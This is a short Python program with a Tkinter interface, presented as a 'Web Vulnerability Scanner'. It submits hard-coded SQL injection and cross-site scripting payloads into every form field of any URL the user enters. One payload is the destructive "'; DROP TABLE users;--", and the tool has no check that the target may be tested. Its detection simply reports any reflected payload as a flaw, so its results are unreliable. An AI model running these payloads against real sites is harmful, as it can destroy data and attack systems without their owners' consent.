import tkinter as tk
from tkinter import messagebox, scrolledtext
import requests
from bs4 import BeautifulSoup
import threading

# SQLi and XSS payloads
sql_payloads = ["' OR '1'='1", "'; DROP TABLE users;--", "' OR 1=1--"]
xss_payloads = ['<script>alert("XSS")</script>', '" onmouseover="alert(1)"']

# Main scan function (runs in background thread)
def scan_website_thread(url):
    output.insert(tk.END, f"🔍 Scanning {url}...\n\n")
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')

        if not forms:
            output.insert(tk.END, "No forms found on the page.\n")
            return

        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            form_url = url if not action else requests.compat.urljoin(url, action)
            inputs = form.find_all('input')

            for payload in sql_payloads + xss_payloads:
                data = {}
                for input_tag in inputs:
                    name = input_tag.get('name')
                    if name:
                        data[name] = payload

                if method == 'post':
                    res = requests.post(form_url, data=data)
                else:
                    res = requests.get(form_url, params=data)

                if payload in res.text:
                    vuln_type = "XSS" if "script" in payload else "SQL Injection"
                    output.insert(tk.END, f"🔴 Possible {vuln_type} found at: {form_url}\nPayload: {payload}\n\n")

        output.insert(tk.END, "✅ Scan complete.\n")

    except Exception as e:
        output.insert(tk.END, f"❌ Error: {e}\n")

# Start thread on button click
def start_scan():
    url = entry_url.get()
    output.delete('1.0', tk.END)

    if not url.startswith('http'):
        messagebox.showwarning("Invalid URL", "Please enter a valid URL starting with http or https")
        return

    scan_thread = threading.Thread(target=scan_website_thread, args=(url,))
    scan_thread.start()

# Tkinter GUI
root = tk.Tk()
root.title("Web Vulnerability Scanner")
root.geometry("700x500")

tk.Label(root, text="Enter Website URL:").pack(pady=5)
entry_url = tk.Entry(root, width=80)
entry_url.pack(pady=5)

tk.Button(root, text="Scan", command=start_scan, bg="green", fg="white").pack(pady=10)

output = scrolledtext.ScrolledText(root, height=20)
output.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

root.mainloop()
